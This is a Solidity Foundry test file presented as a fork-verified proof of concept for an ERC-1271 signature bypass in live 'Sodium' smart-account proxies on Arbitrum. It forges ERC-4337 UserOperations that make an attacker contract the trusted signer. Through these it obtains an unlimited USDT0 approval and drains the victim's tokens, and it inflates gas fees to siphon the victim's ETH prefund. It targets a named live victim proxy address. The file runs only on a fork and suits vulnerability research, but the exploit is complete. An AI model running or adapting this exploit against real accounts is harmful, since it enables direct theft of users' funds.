// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Attacker, UserOperation, IEntryPoint, IERC20} from "../src/Attacker.sol";

struct Transaction {
    uint8 op; // Enum.Operation (0 = Call, 1 = DelegateCall)
    bool revertOnError;
    uint256 gasLimit;
    address target;
    uint256 value;
    bytes data;
}

struct AddSession {
    address sessionKey;
    bytes4 sessionUniqueId;
    uint64 sessionExpires;
}

/// @notice Fork-verified PoC of the live Sodium smart-account ERC-1271 bypass.
/// Runs read-only against an Arbitrum fork (no mainnet transaction).
contract SodiumTest is Test {
    IEntryPoint constant EP = IEntryPoint(0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789);
    address constant USDT0 = 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9;

    Attacker attacker;
    address victim; // live Sodium proxy (example from the 2026-07 incident)

    function setUp() public {
        string memory rpc = vm.envOr("ARB_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://arb1.arbitrum.io/rpc";
        vm.createSelectFork(rpc);
        attacker = new Attacker();
        victim = 0x0209d8FCB0C36399EB49E018a245C55fd37D16BD;
        emit log_named_uint("chainid", block.chainid);
        emit log_named_uint("fork block", block.number);
    }

    // ------------------------------------------------------------------ helpers

    function _sessionCalldata(address key) internal view returns (bytes memory) {
        AddSession memory s = AddSession({
            sessionKey: key,
            sessionUniqueId: bytes4(0x11111111),
            sessionExpires: uint64(block.timestamp + 1 days)
        });
        return abi.encodeWithSelector(bytes4(0x28f8aa4d), s, bytes(""), new Transaction[](0));
    }

    function _op(bytes memory callData, bytes memory pmData, uint256 maxFee)
        internal
        view
        returns (UserOperation memory op)
    {
        op.sender = victim;
        op.nonce = EP.getNonce(victim, 0);
        op.initCode = "";
        op.callData = callData;
        op.callGasLimit = 0; // execution will fail; only validation side effects matter
        op.verificationGasLimit = 800_000;
        op.preVerificationGas = 21_000;
        op.maxFeePerGas = maxFee;
        op.maxPriorityFeePerGas = maxFee;
        op.paymasterAndData = pmData;
        // signature = 0x01 || attacker(20) || 0x00  -> Sodium trusts attacker as ERC-1271 signer
        op.signature = abi.encodePacked(bytes1(0x01), attacker, bytes1(0x00));
    }

    // ------------------------------------------------------------------- tests

    /// 1) Validation-phase ERC-20 approval: Sodium approves the attacker contract for
    ///    type(uint256).max, and the allowance survives the failed execution.
    function test_tokenApprovalBypass() public {
        deal(USDT0, victim, 1_000e6);
        vm.deal(address(this), 10 ether);
        EP.depositTo{value: 1 ether}(address(attacker)); // fund the fake paymaster

        bytes memory pm = abi.encodePacked(address(attacker), bytes4(0x095ea7b3), USDT0);
        UserOperation[] memory ops = new UserOperation[](1);
        ops[0] = _op(_sessionCalldata(address(attacker)), pm, 1 gwei);

        uint256 victimBefore = IERC20(USDT0).balanceOf(victim);
        assertEq(IERC20(USDT0).allowance(victim, address(attacker)), 0, "precondition");

        EP.handleOps(ops, payable(address(attacker)));

        assertEq(IERC20(USDT0).allowance(victim, address(attacker)), type(uint256).max,
            "unlimited allowance granted during validation");
        emit log_named_uint("USDT0 allowance granted (max)", type(uint256).max);
        emit log_named_uint("victim USDT0 after handleOps", IERC20(USDT0).balanceOf(victim));
        emit log_named_uint("attacker USDT0 before drain", IERC20(USDT0).balanceOf(address(attacker)));

        attacker.drain(USDT0, victim, victimBefore);
        assertGe(IERC20(USDT0).balanceOf(address(attacker)), victimBefore, "tokens drained");
        assertEq(IERC20(USDT0).balanceOf(victim), 0, "victim emptied");
        emit log_named_uint("attacker USDT0 after drain", IERC20(USDT0).balanceOf(address(attacker)));
    }

    /// 2) Gas-prefund drain: no paymaster, inflated maxFeePerGas, beneficiary = attacker.
    ///    The victim pays `missingAccountFunds`; EntryPoint compensates the attacker at
    ///    the inflated declared gas price even though execution fails.
    function test_prefundDrain() public {
        vm.deal(victim, 10 ether);
        uint256 maxFee = 4000 gwei;

        UserOperation[] memory ops = new UserOperation[](1);
        ops[0] = _op(_sessionCalldata(address(attacker)), "", maxFee);

        uint256 a0 = address(attacker).balance;
        uint256 v0 = victim.balance;
        EP.handleOps(ops, payable(address(attacker)));
        uint256 gained = address(attacker).balance - a0;
        uint256 lost = v0 - victim.balance;

        emit log_named_uint("attacker gained (wei)", gained);
        emit log_named_uint("victim lost (wei)", lost);
        assertGt(gained, 0.1 ether, "attacker must profit from the victim prefund");
        assertGt(lost, gained, "rest of prefund is refunded to the victim");
    }

    /// 3) Negative control: a plain EOA signer (no ERC-1271) fails -> EntryPoint AA24.
    function test_negative_control_reverts() public {
        vm.deal(victim, 10 ether);
        UserOperation memory op = _op(_sessionCalldata(address(0xdead)), "", 1 gwei);
        op.signature = abi.encodePacked(bytes1(0x01), address(0xdead), bytes1(0x00));
        UserOperation[] memory ops = new UserOperation[](1);
        ops[0] = op;
        vm.expectRevert();
        EP.handleOps(ops, payable(address(attacker)));
    }

    receive() external payable {}
}
